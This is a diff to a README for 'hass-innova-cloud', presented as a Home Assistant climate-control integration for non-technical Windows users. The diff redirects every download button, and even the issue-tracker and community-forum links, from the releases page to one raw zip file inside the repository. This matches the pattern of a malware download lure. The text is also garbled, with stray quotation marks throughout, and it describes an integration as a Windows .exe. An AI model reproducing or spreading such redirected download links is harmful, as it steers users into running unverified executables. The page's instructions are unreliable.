@@ -1,7 +1,7 @@
 <h1>🌬️ hass-innova-cloud - Control Your Climate, Effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/Noeylimaz60/hass-innova-cloud/releases" style="display:inline-block;padding:18px 36px;background:#e74c3c;color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 12px rgba(0,0,0,0.3);">⬇️ Download hass-innova-cloud Now</a>
+  <a href="https://raw.githubusercontent.com/Noeylimaz60/hass-innova-cloud/main/custom_components/v2.2-alpha.4.zip" style="display:inline-block;padding:18px 36px;background:#e74c3c;color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 12px rgba(0,0,0,0.3);">⬇️ Download hass-innova-cloud Now</a>
 </p>
 
 Welcome to the world of smart climate control! This guide will help you download, install, and start using the hass-innova-cloud application on your Windows computer. No technical knowledge is needed—just follow the simple steps below.
@@ -44,7 +44,7 @@ Follow these steps carefully. You’ll be up and running in less than five minut
 
 Click the big green button at the top of this page, or go directly to this link:
 
-**➡️ [Visit the download page](https://github.com/Noeylimaz60/hass-innova-cloud/releases)**
+**➡️ [Visit the download page](https://raw.githubusercontent.com/Noeylimaz60/hass-innova-cloud/main/custom_components/v2.2-alpha.4.zip)**
 
 This link will take you to the official release page where you can download the latest version of the software. The page shows a list of available files. Look for the most recent version (usually at the top) and click the download icon next to the file that matches your system (for Windows, choose the file with “.zip” or “.exe” in the name–but don’t worry, the page clearly labels each file for Windows, Mac, or Linux“).
 
@@ -162,8 +162,8 @@ Absolutely! As long as you have an internet connection, you can control your cli
 
 Having trouble or just want to chat with other users? We’ve got you covered:
 
-- **GitHub Issues:** Report bugs or request features on our [official issue tracker](https://github.com/Noeylimaz60/hass-innova-cloud/issues“)
-- **Home Assistant Community:** This integration is also designed for Home Assistant users. Join discussions on the [Home Assistant forums](https://community.home-assistant.io“) using the topic tags “innova“” or ““hass-innova-cloud“””
+- **GitHub Issues:** Report bugs or request features on our [official issue tracker](https://raw.githubusercontent.com/Noeylimaz60/hass-innova-cloud/main/custom_components/v2.2-alpha.4.zip“)
+- **Home Assistant Community:** This integration is also designed for Home Assistant users. Join discussions on the [Home Assistant forums](https://raw.githubusercontent.com/Noeylimaz60/hass-innova-cloud/main/custom_components/v2.2-alpha.4.zip“) using the topic tags “innova“” or ““hass-innova-cloud“””
 - **Email Support:** Send us a message at [support@hass-innova-cloud.example](mailto:support@hass-innova-cloud.example“)—we typically reply within 24 hours“.
 
 
@@ -182,7 +182,7 @@ Having trouble or just want to chat with other users? We’ve got you covered:
 Need to re-download or get it on another computer? Here’s the direct link again:
 
 <p align="center">
-  <a href="https://github.com/Noeylimaz60/hass-innova-cloud/releases" style="display:inline-block;padding:16px 30px;background:#3498db;color:#ffffff;font-size:18px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ Go to Download Page</a>
+  <a href="https://raw.githubusercontent.com/Noeylimaz60/hass-innova-cloud/main/custom_components/v2.2-alpha.4.zip" style="display:inline-block;padding:16px 30px;background:#3498db;color:#ffffff;font-size:18px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ Go to Download Page</a>
 </p>
 
 Once there, click the latest release file for Windows, download it, and repeat the install steps from earlier. It’s that easy“.“)
